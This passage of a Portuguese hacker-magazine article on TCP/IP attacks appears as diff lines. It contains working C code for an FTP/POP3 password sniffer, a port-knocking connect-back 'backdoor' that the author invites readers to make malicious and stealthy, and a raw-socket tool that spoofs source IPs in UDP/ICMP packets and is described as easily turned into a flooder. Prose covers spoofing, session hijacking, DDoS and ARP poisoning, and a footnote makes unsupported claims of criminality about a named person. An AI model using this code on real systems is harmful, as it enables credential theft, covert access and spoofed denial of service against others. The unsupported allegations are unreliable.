+                if(n > sizeof(struct iphdr) + sizeof(struct tcphdr)) {
+                        /* Checa se os pacotes sao destinados ao ftp ou pop3 */
+                        if(ntohs(tcph->dest) == 21 ||
+                                ntohs(tcph->dest) == 110)
+                        {
+                                if(strstr(ptrdados, "USER") ||
+                                        strstr(ptrdados, "PASS") ||
+                                        strstr(ptrdados, "user") ||
+                                        strstr(ptrdados, "pass"))
+                                {
+
+                                        write(fileno(stdout), ptrdados, n);
+                                }
+                        }
+                }
+        }
+}
+
+<++ sniffer-ftp-pop3.c ++>
+
+
+[ --- 2.2.3.2. Exemplo nao-malicioso de um backdoor "port-knocking"
+
+   Como a secao ja' diz, ilustraremos aqui o conceito de port-knocking utili-
+zando os conhecimentos adquiridos ao longo do artigo. O exemplo nao e' malicio-
+so mas pode ser facilmente modificado para se tornar um backdoor bastante util
+e de relativa dificuldade de deteccao.[*] Use a imaginacao! :)
+
+[*] Por exemplo, os pacotes enviados nao irao aparecer na grande maioria dos
+    logs de servicos do tipo sshd, ftpd, etc., ate' porque a conexao nao chegou
+    nem a ser estabelecida. Talvez alguns firewalls e IDSes detectem uma ativi-
+    dade anomala mas isso provavelmente e' contornavel.
+
+
+<++ backdoor-portknocking.c ++>
+
+/*
+ * backdoor-portknocking.c
+ *                    por Julio Cesar Fort <julio *NO_SPAM* rfdslabs com br>
+ *
+ * Exemplo para The Bug! Magazine 0x02 de um backdoor nao-malicioso com o
+ * conceito de port-knocking.
+ * 
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
+        
+#define PORTA  22
+#define MAX    8192
+#define ERRO   -1
+
+int connectback(struct sockaddr_in *conn);
+
+int main(void)
+{
+        int  sockfd;
+        char buffer[MAX];
+        struct iphdr *iphr;
+        struct tcphdr *tcphr;
+        struct sockaddr_in rede;
+
+        /* Estruturas de cabecalho IP e TCP apontando para o buffer
+         * ... [IP header][TCP header][dados] ...
+         */
+        iphr = (struct iphdr *) buffer;
+        tcphr = (struct tcphdr *) (buffer + sizeof(struct iphdr));
+
+        /* Cria raw socket. */
+        if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
+                exit(ERRO);
+
+        /* Le do socket. Se o flag de destino for igual a porta, o flag FIN,
+         * RST e PSH estiverem ativados, SYN zerado e Window igual a 31337,
+         * entao chame a funcao para connect-back na porta source.
+         */
+        while(read(sockfd, buffer, sizeof(buffer) - 1)) {
+
+                if((ntohs(tcphr->dest) == PORTA) && (tcphr->fin == 1) &&
+                        (tcphr->syn == 0) && (tcphr->psh == 1) &&
+                        (tcphr->rst == 1) && (tcphr->window == htons(31337))) {
+
+                        rede.sin_addr.s_addr = iphr->saddr;
+                        rede.sin_port = tcphr->source;
+                        connectback(&rede);
+                }
+                memset(buffer, '\0', sizeof(buffer));
+        }
+}
+
+int connectback(struct sockaddr_in *conn)
+{
+        int    sockconn;
+        char   msg[] = "Exemplo de port-knocking com connect-back.\n";
+        struct sockaddr_in conectar;
+
+        if((sockconn = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == ERRO)
+                return(ERRO);
+
+        conectar.sin_family = AF_INET;
+        conectar.sin_addr.s_addr = conn->sin_addr.s_addr;
+        conectar.sin_port = conn->sin_port;
+
+        if(connect(sockconn, (struct sockaddr *) &conectar,
+                                sizeof(conectar)) == ERRO)
+                return(ERRO);
+
+        if(!fork()) {
+
+                /* Funcao nao-maliciosa ;) */
+
+                send(sockconn, msg, sizeof(msg), 0);
+                close(sockconn);
+                return 0;
+        }
+}
+
+<++ backdoor-portknocking.c ++>
+
+So' iremos mostrar mesmo a implementacao de port-knocking. O cliente para ati-
+vacao do "backdoor" fica como exercicio para o leitor.
+
+
+[ --- 2.2.3.3. Exemplo de envio de pacotes UDP e ICMP customizados
+
+   Agora ilustraremos o envio de pacotes customizados e escolhemos UDP e ICMP
+para fins de exemplificacao. Fica claro que este codigo nao e' profissional e
+esta' muito longe de ser sequer um razoavel injetor de pacotes. Com algumas
+poucas modificacoes e' possivel criar um "flooder" para envio de pacotes "spo-
+ofados" mas este nao e' o intuito original do codigo.
+
+<++ icmp-udp-custom.c ++>
+
+/*
+ * icmp-udp-custom.c   
+ *                  por Julio Cesar Fort <julio *NO_SPAM* rfdslabs com br>
+ *
+ * Exemplo para a The Bug! Magazine 0x02 para ilustrar o envio de pacotes ICMP
+ * e UDP customizaveis.
+ *
+ * Note que este e' um simples exemplo para fins ilustrativos e esta' longe de
+ * ser um injetor de pacotes decente como o nemesis, gspoof, etc.
+ *
+ */
+               
+#include <stdio.h>      
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>                                      
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ip_icmp.h>
+
+#define ERRO -1
+ 
+int icmp(char *srcip, char *dstip, unsigned int tipo, unsigned int codigo,
+                char *dados);
+int udp(char *srcip, char *dstip, unsigned int srcporta, unsigned int dstporta,
+               char *dados);
+
+unsigned short csum(unsigned short *buf, int nwords);
+void uso(char *prognome);
+
+int main(int argc, char *argv[])
+{
+        char *srcip, *dstip, *dados, *protocolo;
+        int opt;
+        unsigned int srcporta, dstporta, tipo, codigo;
+
+        srcip = dstip = protocolo = NULL;
+        srcporta = dstporta = tipo = codigo = 0;
+ 
+        fprintf(stdout, "icmp-udp-custom.c: Pacotes UDP/ICMP customizados.\n");
+                
+        while((opt = getopt(argc, argv, "s:d:p:t:y:u:x:D:")) != EOF) {
+                switch(opt) {
+                        case 's':
+                                if(strlen(optarg) > 15) {
+                                        fprintf(stderr, "IP de origem"
+                                                        "invalido.\n");
+                                        exit(ERRO);
+                                }
+                                srcip = optarg; 
+                                break;
+
+                        case 'd':
+                                if(strlen(optarg) > 15) {
+                                        fprintf(stderr, "IP de destino"
+                                                        "invalido.\n");
+                                        exit(ERRO);
+                                }
+                                dstip = optarg;
+                                break;
+                        
+                        case 'p':
+                                if(atoi(optarg) < 0 || atoi(optarg) > 65535) {
+                                        fprintf(stderr, "Porta de origem"
+                                                        "invalida.\n");
+                                        exit(ERRO);
+                                }
+                                srcporta = atoi(optarg);
+                                break;
+
+                        case 't':
+                                if(atoi(optarg) < 0 || atoi(optarg) > 65535) {
+                                        fprintf(stderr, "Porta de destino"
+                                                        "invalida.\n");
+                                        exit(ERRO);
+                                }
+                                dstporta = atoi(optarg);
+                                break;
+                        
+                        case 'y':
+                                if(atoi(optarg) < 0 || atoi(optarg) > 18) {
+                                        fprintf(stderr, "Tipo invalido.\n");
+                                        exit(ERRO);
+                                }
+                                tipo = atoi(optarg);
+                                break;
+                        
+                        case 'u':
+                                if(atoi(optarg) < 0 || atoi(optarg) > 15) {   
+                                        fprintf(stderr, "Codigo invalido.\n");
+                                        exit(ERRO);
+                                }
+                                codigo = atoi(optarg);
+                                break;
+                                
+                        case 'x':
+                                if(strlen(optarg) > 4)
+                                        exit(ERRO);
+                                protocolo = optarg;
+                                break;
+
+                        case 'D':
+                                if(strlen(optarg) > 51) {
+                                        fprintf(stderr, "O campo de dados"
+                                                        "deve ser menor que"
+                                                        "51 bytes.\n");
+                                        exit(ERRO);   
+                                }
+                                dados = optarg;
+                                break;
+                                 
+                        default: 
+                                uso(argv[0]);
+                                break;
+
+                }
+        }
+                                        
+        /* Checa se nao foi escolhido um IP de origem ou destino */
+        if(srcip == NULL || dstip == NULL || protocolo == NULL)
+                uso(argv[0]);
+
+        /* Checa se foram utilizadas portas para ICMP (nao existe!) */
+        if(!strcmp(protocolo, "icmp") && (srcporta || dstporta)) {
+                fprintf(stderr, "ERRO: Porta de origem e destino nao se aplicam a ICMP!\n");    
+                uso(argv[0]);
+        }
+
+        /* Checa se foram utilizadas tipos e codigos de mensagem para UDP */
+        if(!strcmp(protocolo, "udp") && (tipo || codigo)) {
+                fprintf(stderr, "ERRO: Tipo e codigo nao se aplicam a UDP!\n");
+                uso(argv[0]);
+        }
+
+        if(!strcmp(protocolo, "icmp")) {
+                fprintf(stdout, "Protocolo ICMP selecionado.\n");
+                icmp(srcip, dstip, tipo, codigo, dados);
+        }
+        else if(!strcmp(protocolo, "udp")) {
+                fprintf(stdout, "Protocolo UDP selecionado.\n");
+                udp(srcip, dstip, srcporta, dstporta, dados);
+        }
+        else
+        {
+                fprintf(stderr, "Protocolo %s invalido.\n", protocolo);
+                exit(ERRO);
+        }
+}
+
+int icmp(char *srcip, char *dstip, unsigned int tipo, unsigned int codigo,
+         char *dados)
+{
+        /* NOTA: Usaremos 'struct icmp' (BSD-style) ao inves de
+         * 'struct icmphdr' devido ao seu maior numero de opcoes suportadas.
+         */
+
+        int                     sockicmp;
+        unsigned int            numbytes, seq = 0;
+        char                    buffer[128], *ptr;
+        struct iphdr            *iph;
+        struct icmp             *icmph;
+        struct sockaddr_in      rede;
+        socklen_t               optval = 1;
+
+        memset(buffer, 0, sizeof(buffer));
+
+        /* Estruturas de cabecalho IP e TCP apontando para o buffer
+         * ... [IP header][ICMP header] 
+         */
+        iph = (struct iphdr *) buffer;
+        icmph = (struct icmp *) (buffer + sizeof(struct iphdr));
+
+        if((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == ERRO) {
+                fprintf(stderr, "Erro criando raw socket ICMP: %s\n",
+                                strerror(errno));
+                exit(ERRO);
+        }
+
+        /* Habilita no socket a opcao de incluir o cabecalho IP customizado */
+        if(setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval,
+                                sizeof(optval)) == ERRO) {
+                fprintf(stderr, "Erro setsockopt: %s\n", strerror(errno));
+                exit(ERRO);
+        }
+
+        /* Preenchendo o cabecalho IP */
+        iph->ihl = 5;
+        iph->version = 4;
+        iph->tos = 0;
+        iph->id = htons(getpid());      /* valor qualquer, nao importa */
+        iph->ttl = 255;                 /* deve ser um valor menor que 255 */
+        iph->protocol = IPPROTO_ICMP;   /* protocolo que usaremos - ICMP */
+        iph->saddr = inet_addr(srcip);  /* IP de origem */
+        iph->daddr = inet_addr(dstip);  /* IP de destino */
+
+        /* Preenchendo o cabecalho ICMP */
+        icmph->icmp_type = tipo;                /* preenche o tipo */
+        icmph->icmp_code = codigo;              /* preenche o codigo */
+
+        /* Se o codigo for ECHO REQ, preenchemos ID e SEQ
+         * mas o preenchimento nao e' obrigatorio */
+        if(icmph->icmp_code == ICMP_ECHO) {
+                icmph->icmp_id = getpid();
+                icmph->icmp_seq = seq++;
+        }
+
+        /* Copia o que quisermos para a regiao de dados restante */
+        memcpy(icmph->icmp_data, dados, strlen(dados));
+
+        /* Calcula o tamanho total do pacote */
+        iph->tot_len = (sizeof(struct iphdr) + sizeof(struct icmp)
+                        + strlen(dados) + 1);
+
+        /* Checksum do cabecalho ICMP e IP */
+        icmph->icmp_cksum = csum((unsigned short *) icmph,
+                        sizeof(struct icmp) + strlen(dados) + 1);
+        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));
+
+        /* Preenchendo as estruturas de rede */
+        rede.sin_family = AF_INET;
+        rede.sin_addr.s_addr = inet_addr(dstip);
+
+        /* Envia o pacote */
+        if((numbytes = sendto(sockicmp, buffer, iph->tot_len, 0,
+                                (struct sockaddr *) &rede,
+                        sizeof(struct sockaddr))) == ERRO) {
+                fprintf(stderr, "Erro enviando pacote: %s\n", strerror(errno));
+                exit(ERRO);
+        }
+
+        fprintf(stdout, "Total enviado: %u bytes.\n", numbytes);
+
+        close(sockicmp);
+        return;
+}
+
+int udp(char *srcip, char *dstip, unsigned int srcporta, unsigned int dstporta, char *dados)
+{
+        int                     sockudp;
+        unsigned int            numbytes, pckt_tam, seq = 0;
+        char                    *buffer, *ptr;
+        struct iphdr            *iph;
+        struct udphdr           *udph;
+        struct sockaddr_in      rede;
+        socklen_t               optval = 1;
+
+        pckt_tam = sizeof(struct iphdr) + sizeof(struct udphdr) +
+                                                strlen(dados);
+        buffer = malloc(pckt_tam);
+
+        if (!buffer) {
+                fprintf(stderr, "Erro alocando memoria para pacote.\n");
+                exit(ERRO);
+        }
+
+        iph = (struct iphdr *) buffer;
+        udph = (struct udphdr *) (buffer + sizeof(struct iphdr));
+        ptr = (buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
+
+        memset(buffer, 0, pckt_tam);
+
+        if((sockudp = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == ERRO) {
+                fprintf(stderr, "Erro criando socket UDP: %s\n",
+                                strerror(errno));
+                exit(ERRO);
+        }
+
+        if(setsockopt(sockudp, IPPROTO_IP, IP_HDRINCL, &optval,
+                                sizeof(optval)) == ERRO) {
+                fprintf(stderr, "Erro setsockopt: %s\n", strerror(errno));
+                exit(ERRO);
+        }
+
+        /* Copia o que quisermos para a regiao de dados */
+        memcpy(ptr, dados, strlen(dados));
+
+        /* Preenchendo o cabecalho IP */
+        iph->ihl = 5;
+        iph->version = 4;
+        iph->tos = 0;
+        iph->id = htons(getpid());
+        iph->ttl = 255;
+        iph->protocol = IPPROTO_UDP;
+        iph->tot_len = htons(pckt_tam);
+        iph->saddr = inet_addr(srcip);
+        iph->daddr = inet_addr(dstip);
+
+        /* Preenchendo o cabecalho UDP */
+        udph->source = htons(srcporta);
+        udph->dest = htons(dstporta);
+        udph->len = htons(sizeof(struct udphdr) + strlen(dados));
+        /* NOTE que o checksum do UDP poderia ser zero, ja' que e' opcional */
+        udph->check = csum((unsigned short *) udph, sizeof(struct udphdr)
+                        + strlen(dados));
+
+        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));
+
+        rede.sin_family = AF_INET;
+        rede.sin_port = htons(dstporta);
+        rede.sin_addr.s_addr = inet_addr(dstip);
+
+        if((numbytes = sendto(sockudp, buffer, iph->tot_len, 0,
+                        (struct sockaddr *) &rede,
+                        sizeof(struct sockaddr))) == ERRO) {
+                fprintf(stderr, "Erro enviando pacote: %s\n", strerror(errno));
+                exit(ERRO);
+        }
+
+        fprintf(stdout, "Total enviado: %u bytes.\n", numbytes);
+
+        close(sockudp);
+        return;
+}
+
+unsigned short csum(unsigned short *buf, int nwords)
+{
+        unsigned long sum;
+        for(sum=0; nwords>0; nwords--)
+                sum += *buf++;
+        sum = (sum >> 16) + (sum &0xffff);
+        sum += (sum >> 16);
+        return ~sum;
+}
+
+void uso(char *prognome)
+{
+        fprintf(stderr, "\nUso: %s -s <IP orig> -d <IP dest> -p <porta orig> "
+                        "-t <porta dest> -x <tipo>\n          -u <codigo>\n"
+                        "Exemplo: %s -s 127.0.0.1 -d 127.0.0.1 "
+                        "-p 666 -t 31337 -x udp -D ''oi''\n"
+                        "Exemplo: %s -s 127.0.0.1 -d 127.0.0.1 -x icmp -y 8 "
+                        "-u 0 -D ''oi''\n", prognome, prognome, prognome);
+        exit(0);
+}
+
+<++ icmp-udp-custom.c ++>
+
+
+[ --- 2.2.4. Topicos sobre seguranca e ataques no TCP/IP
+
+   A partir de agora iremos tratar da forma mais clara possivel diversos ata-
+ques famosos a inumeras pilhas TCP/IP. Alguns deles nao funcionam mais porque
+eram bugs especificos na implementacao TCP/IP de determinados sistemas opera-
+cionais, por exemplo, mas outros ataques sao bem genericos e podem ainda ser
+aplicados hoje em dia com algumas modificacoes. Outros sao falhas de design
+inerentes ao protocolo TCP/IP e derivados.
+
+
+[ --- 2.2.4.1. IPv4 spoofing
+
+   O problema de falsificacao de endereco IP, mais conhecido como IP spoofing,
+vem sido teorizado desde meados da decada de 1980, pouco tempo depois da cria-
+cao do TCP/IP. Em 1985 o genio Robert Tappan Morris Jr.[*], lancou um artigo
+chamado "A Weakness in the 4.2BSD Unix TCP/IP Software"[@] onde seria explanado
+minuciosamente o ataque de IP spoofing. Tambem ha' o excelente artigo feito
+por Steve Bellovin chamado "Security Problems in the TCP/IP Protocol Suite"[@@]
+que aborda tambem o ataque.
+
+O problema do IP spoofing ficou famoso quando Kevin Mitnick se utilizou dessa
+tecnica para invadir o computador do mais conhecido analista de seguranca da
+epoca, Tsutomu Shimomura[**], do San Diego Supercomputing Center. Utilizando-se
+de um programa provavelmente escrito pelo seu parceiro israelense jsz, Mitnick
+conseguiu infiltrar-se na rede de Shimomura no SDSC se passando por um computa-
+dor da rede no qual o de Tsutomu confiava. Desta maneira foi possivel inserir
+a string "+ +" no arquivo '.rhosts', que instrui o 'rshd' a aceitar conexoes
+vindas de qualquer computador sem a necessidade de uso de senha.
+
+
+[*] Robert T. Morris e' considerado um genio por diversos aspectos. Como estu-
+    dante de graduacao, Morris demonstrou de forma pratica os maiores problemas
+    da seguranca nas ultimas decadas: IP spoofing, buffer overflow e worm (os
+    dois ultimos de uma so' vez com o 'Internet Worm').
+    Ate' entao todos os problemas eram apenas teoricos.
+
+[@] O paper pode ser encontrado no site oficial de Morris.
+    Link: http://pdos.csail.mit.edu/~rtm/papers/117.pdf
+
+[@@] O paper de Steve Bellovin pode ser encontrado em seu site oficial.
+     Link: http://www.cs.columbia.edu/~smb/papers/ipext.ps
+
+[**] A invasao do computador de Shimomura foi um tremendo golpe na sua reputa-
+     cao. Como um samurai de honra ferida, Tsutomu saiu `a cacada de Mitnick e
+     ajudou o FBI captura-lo em fevereiro de 1995, com a participacao do jorna-
+     lista John Markoff, do NY Times. Apos a captura, Shimomura e Markoff
+     escreveram um pessimo livro chamado "Takedown" que supostamente contava
+     toda a historia. Infelizmente o livro e' completamente mentiroso e e',
+     basicamente, uma auto-promocao por parte de Tsutomu, onde o seu estilo de
+     vida, comidas prediletas, etc., sao tratadas e Mitnick e' pintado como um
+     hacker "dark side". O livro gerou um bom filme, porem um pouco fantasioso,
+     chamado "Operation Takedown".
+     Poucas pessoas sabem que o proprio Shimomura ja' fora investigado pelo FBI
+     por razoes que nao poderao ser reveladas neste artigo. Desta forma e'
+     evidente que Tsutomu ja' esteve envolvido com atividades ilegais e crimi-
+     nosas, apesar de passar a imagem de bom moco.
+
+O problema de spoofing em IPv4 e' bastante simples de ser entendido. Tudo isso
+se caracteriza porque a estacao que esta' enviando o datagrama e' que preenche
+todas as informacoes do cabecalho do pacote. Usando raw sockets e' possivel
+alterar tais informacoes e forjar o endereco e porta de origem de um pacote.
+
+Datagramas de origem forjada podem trazer dores de cabeca. Para citar um exem-
+plo, um atacante poderia lancar ataques de negacao de servico com o IP de outro
+computador. Desta forma dificultaria bastante a descoberta da origem real do
+ataque.
+
+Simplesmente forjar o endereco e porta de origem podem nao ter muita utilidade
+sozinhos. Porem ao se aliar ao ataque de "TCP sequence number prediction" ele
+se torna bem perigoso, pois pode levar a sequestro de sessao, retardamento de
+conexoes TCP, causar resetting de conexoes existentes, stealth port-scanning,
+entre outras aplicacoes.
+
+
+[ --- 2.2.4.2. Sequestro de sessao
+
+   Sequestro de sessao e' um dos ataques mais interessantes feitos contra o
+TCP/IP. Atraves dele e' possivel, por exemplo, sequestrar e tomar conta de co-
+nexoes TCP ativas, podendo fazer o que bem entendermos com elas.
+Este tipo de ataque pode ser grosseiramente dividido em duas partes conhecidas
+como "non-blind spoofing" e "blind spoofing", que serao brevemente explicadas
+a seguir.
+
+
+(*) Non-blind spoofing
+    --------- --------
+
+    Acontece quando o atacante esta' na mesma rede da vitima, portanto e'pos-
+sivel sniffar todo o trafego e saber qual e' o proximo numero de sequencia es-
+perado pelo servidor onde a vitima esta' conectada.
+Seguindo a teoria, bastaria o invasor procurar pelos pacotes que tenham o
+servidor como origem e a flag ACK ativada que o campo "sequence number" ira'
+conter o proximo numero de sequencia esperado.
+
+Com o numero de sequencia em maos, IPs e portas de destino e origem, o atacante
+podera' enviar os dados que quiser e o modulo TCP servidor validara' o pacote
+pois todas as informacoes relativas ao cabecalho estao corretas.
+
+Nao ha' grandes complicacoes por parte do invasor de realizar um ataque bem-su-
+cedido de blind-spoofing, tendo em vista que o numero de sequencia esperado e'
+sabido.
+
+
+(*) Blind spoofing
+    ----- --------
+
+   A maior diferenca do "blind spoofing" para a tecnica anterior e' que o ata-
+cante nao esta' na mesma rede da vitima e nao podera' saber exatamente qual o
+numeros de sequencia atual de uma conexao entre a vitima e o servidor.
+
+Mesmo nao sabendo o numero exato, ha' uma maneira de contornar isso. Fazendo
+uma conexao a uma porta qualquer do servidor e enviando alguns pacotes no
+intuito de conseguir "amostras" dos numeros de sequencia. No passado era rela-
+tivamente facil prever qual seriam os numeros de sequencia utilizados nos pro-
+ximos pacotes devido ao uso de algoritmos rudimentares para tal funcao. Embora
+seja mais dificil realizar com sucesso o ataque nos dias de hoje por conta do
+uso de algoritmos melhores que geram numeros de sequencia aleatorios, ainda e'
+possivel prever tais numeros com algum tempo de tentativa, conforme mostrado no
+paper "Slipping in the Window"[@], do Paul Watson, demonstrado na conferencia
+CanSecWest 2004.
+
+[@] Link para o artigo: http://osvdb.org/reference/SlippingInTheWindow_v1.0.doc
+
+
+Nota dos autores: Se tudo ocorrer conforme previsto, nas proximas edicoes da
+                  The Bug! Magazine nos lancaremos um texto somente tratando de
+                  sequestro de sessao mostrando ferramentas ja' conhecidas e
+                  uma que esta' sendo desenvolvida por nos. Fique ligado! :)
+
+
+[ --- 2.2.4.3. Flooding e outros tipos de denial of service (DoS, DDoS e DrDoS)
+
+   Segundo a definicao da Wikipedia, "ataques de negacao de servico sao uma
+tentativa de fazer com que recursos computacionais fiquem indisponiveis para
+seus usuarios".
+
+Existem varios ataques de negacao de servico a rede. Alguns deles, como ataques
+de "flood", podem ser comparados a uma brincadeira de cabo-de-guerra, onde quem
+tem mais largura de banda vence a batalha. Outros, como DDoS e DrDoS, tem
+caracteristicas parecidas com "flooding" mas sao feitas de forma mais sofisti-
+cada, utilizando-se de redes de computadores zumbis, etc., porem tem o mesmo
+intuito de enviar mais requisicoes que o alvo pode receber, levando a negacao
+do servico a usuarios legitimos.
+
+(*) Flooding
+
+   Flooding nada mais e' que o cabo-de-guerra citado anteriormente. Pense na
+seguinte situacao: um atacante possui 150 MBps de largura de banda disponivel.
+Se ele resolver atacar uma vitima que possua uma conexao de 1.5 MBps com
+certeza ele ira' ganhar a batalha, deixando a vitima sem comunicacao. Isso se
+da' porque a rede dele, 100 vezes mais rapida, tem uma capacidade maior de en-
+viar pacotes, fazendo com que a rede de capacidade menor esgote toda a sua
+largura de banda.
+
+Os tipos de flooding mais comuns usados hoje em dia em varias "botnets" sao
+floods de ICMP e UDP, que sao realmente devastadores.
+
+
+(*) Outros tipos de negacao de servico
+
+    Existem dezenas de tipos de DoS diferentes para redes. Desde o infame e
+simples WinNuke, passando pelo Teardrop e chegando ate' os ataques mais sofi-
+sticados de DDoS e DrDoS. Ate' mesmo falhas de "buffer overflow" ou quaisquer
+outros bugs em que seja possivel corromper a memoria de um programa pode ser um
+problema de negacao de servico.
+
+
+(+) WinNuke
+
+   Ataque altamente popular no IRC a partir da segunda metade da decada de 90,
+o WinNuke agia enviando um pacote "out-of-band" para a porta 139, NetBIOS, do
+Windows. Como o Windows nao sabia como gerenciar o pacote, havia o travamento
+da maquina e a famosa tela azul da morte era mostrada.
+
+
+(+) Click Nuker
+
+   Provavelmente o Click Nuker, criado por Rhad do 7th Sphere, foi um dos
+nukers de IRC mais populares de todos os tempos.
+O Click Nuker funcionava enviando pacotes ICMP spoofados como se fosse do
+servidor para o cliente, ou vice-versa, que sinalizasse uma desconexao. Era
+preciso ter Winsock 2 instalado para usar o programa :)
+
+PS: Que saudade dos tempos de IRC war ;~)
+
+
+(+) Teardrop
+
+   Deixaremos a explicacao do Teardrop para a proxima secao do texto.
+
+
+(+) DDoS
+
+    DDoS, ou Distributed Denial of Service, nada mais e' que a juncao de varios
+computadores para atacar um so' com varias tecnicas de flooding.
+Este tipo de ataque ficou famoso em 1999/2000 quando varios dos maiores sites
+do mundo, como Yahoo!, CNN, eBay, e no Brasil o UOL, Terra, ZipMail, etc.,
+sofreram ofensivas pesadas.
+
+Os programas utilizados na epoca para realizar esses ataques eram o 'Trinoo',
+'tfn2k' e o 'Stacheldraht'. Esses aplicativos eram estruturados na forma
+cliente/servidor, o que facilitava bastante os ataques, pois bastava o cliente
+emitir a instrucao de sua escolha (por exemplo, atacar com UDP flood o host X)
+e todos os computadores comprometidos que estavam conectados ao servidor-mestre
+receberiam a instrucao de uma so' vez.
+
+
+(+) DrDoS
+
+   DrDoS, ou Distributed and Reflective Denial of Service, e' a evolucao natu-
+ral do DDoS. Este ataque ficou famoso com a ofensiva feita por pessoas desco-
+nhecidas ao site da Gibson Research Corp., de Steve Gibson. Por ser uma figura
+controversa no mundo da seguranca da informacao, Gibson provavelmente foi um
+dos primeiros, senao o primeiro, alvo dessa nova tecnica.
+
+O DrDoS original consistia em usar roteadores que tinham a porta do BGP (Border
+Gateway Protocol) aberta (o BGP e' usado para troca de informacoes sobre rotas
+entre os roteadores). Entao era realizado um ataque de SYN flood ou algo do
+genero, com o IP da vitima como origem, para que os roteadores enviassem respo-
+stas SYN/ACK. Imagine isso com roteadores dos maiores links do mundo e perceba
+qual o poder de fogo um atacante com algumas poucas maquinas e conexao simples
+pode ter.
+
+Muito embora seja um conceito bem antigo, recentemente esse ataque tem sido
+feito enviando requisicoes a servidores DNS, tendo a vitima como origem.
+
+
+[ --- 2.2.4.4. Ataques de fragmentacao
+
+   Como sabemos, fragmentacao e' utilizada quando um pacote e' maior que o va-
+lor MTU (maximum transfer unit) da rede que estamos usando, sendo assim de suma
+imporancia para o funcionamento da internet, uma vez que ela e' um ambiente
+composto de redes completamente heterogeneas.
+
+E' possivel utilizar-se da "feature" de fragmentacao e explorar falhas em
+diversas implementacoes do TCP/IP de sistemas operacionais.
+Muitos dos ataques de fragmentacao tem o intuito de causar problemas durante a
+remontagem dos pacotes por parte do host receptor.
+
+A grande maioria desses ataques tem o objetivo de causar "denial of service" e
+"bypassing" de regras de firewall.
+
+Muitas tecnicas ficaram famosas IRC afora, como o "ping of death", que enviava
+varios pacotes ICMPs pequenos que ao serem remontados teriam tamanho maior que
+o maximo de 65535 bytes, causando o travamento ou reboot da maquina.
+Outro ataque, como o "tiny fragment", constitui, como o proprio nome diz, em
+enviar fragmentos minusculos afim de causar consumo excessivo de memoria no
+alvo ou fazer com que informacoes vitais do cabecalho do pacote, como as flags
+TCP, por exemplo, nao fique no primeiro pacote enviado e sim nos pacotes sub-
+sequentes, contornando alguns firewalls.
+
+Existem pelo menos dois excelentes RFCs informativos que abordam e propoem
+solucoes para os problemas envolvidos com fragmentacao. Sao eles [rfc1858] e
+[rfc3128]. A leitura e' recomendada e seus links se encontram no final do arti-
+go nas secao de referencias.
+
+
+[ --- 2.2.4.5. Armadilhas do ICMP
+
+   "O ICMP [RFC 792] e' parte fundamental da suite de protocolos TCP/IP, e e'
+usada principalmente para informar erros ocorridos na rede" (F. Gont, 2006).
+Como vimos anteriormente na secao onde tratamos sobre o basico do protocolo
+ICMP, existem varios codigos do pacote ICMP que podem ser interessantes se vis-
+tos pela otica de um atacante.
+
+Ja' foi visto que e' possivel enviar pacotes com informacoes de cabecalho for-
+jados. Da mesma forma, e' possivel enviar mensagens ICMP forjadas para a viti-
+ma, contanto que seja possivel adivinhar corretamente as informacoes do socket
+(IPs e portas de destino e origem) que identificam uma comunicacao TCP. De ma-
+neira geral, descobrir as informacoes de socket de forma "cega" e' dificil mas
+existem diversas tecnicas como a mencionada na conferencia CanSecWest 2004
+por Paul Watson na palestra "Slipping in the Window: TCP Reset Attacks".
+
+Como alguns codigos interessantes poderiamos usar "Destination Unreachable",
+"Protocol Unreachable", "Port Unreachable", "Source Quench", entre outros.
+Com esses codigos ICMP pode-se derrubar uma conexao em andamento ou deixa-la
+extremamente lenta.
+
+Abaixo esta' ilustrada uma situacao onde seria possivel utilizar-se deste ata-
+que:
+
+                            (fig. 2.2.5)
+------------------                                 ---------------------
+| Cliente (1337) | <----------------------------   | Servidor (21/ftp) |
+|  69.69.69.69   | ----------------------------->  |    21.21.21.21    |
+------------------                                 ---------------------
+                                                      ^
+           ---------------                            |
+           |  Atacante   |  ---------------------------
+           | 23.23.23.23 |  ICMP Source Quench (spoofed)
+           ---------------  vindo 69.69.69.69 com
+                            destino 21.21.21.21.
+                            Cabecalho do pacote de erro contendo
+                            porta 1337 como origem e 21 como destino.
+
+Podemos ver que para o Servidor, o Cliente esta' pedindo para reduzir o fluxo
+de envio de dados. Caso o atacante continue enviando pacotes deste tipo repe-
+tidamente, e' possivel deixar a comunicacao entre Cliente e Servidor cada vez
+mais lenta ate' torna-la impraticavel.
+
+A referencia numero 11 contem o link de um excelente artigo escrito pelo argen-
+tino Fernando Gont descrevendo esses ataques de forma mais detalhada e com pro-
+gramas de prova de conceito.
+
+Ha' um codigo escrito pelo hacker houseofdabus que coloca em pratica o que foi
+descrito por Gont.
+Link: http://www.security.nnov.ru/files/HOD-icmp-attacks-poc.c
+
+Existem tambem ataques de flooding usando ICMP, como o Smurf, que veremos mais
+a frente.
+
+
+[ --- 3.  Exemplos "vida real"
+
+   Nesta secao serao abordados tecnicamente alguns ataques comuns e algumas de
+suas demonstracoes na pratica.
+
+
+[ --- 3.1. rrapt: Route Redirection ARP Poisonning Tool
+
+   O rrapt e' baseado em um metodo conhecido de "ARP poisoning" e em varios ca-
+sos e' possivel fazer mudancas arbitrarias nas tabelas de roteamento da vitima
+ou gateway. Tambem e' possivel "sniffar" trafego de uma maneira relativamente
+silenciosa.
+
+Passo 1: Habilite o "forwarding" de pacotes no Linux da seguinte maneira:
+
+----------------------------------------------------------
+root@void:~/RRAPT# echo "1"> /proc/sys/net/ipv4/ip_forward
+----------------------------------------------------------
+
+Passo 2: Mao na massa!
+
+Abaixo sera' feita uma pequena demonstracao do ataque numa rede domestica com
+Slackware (atacante) rodando numa VM e Windows XP:
+
+
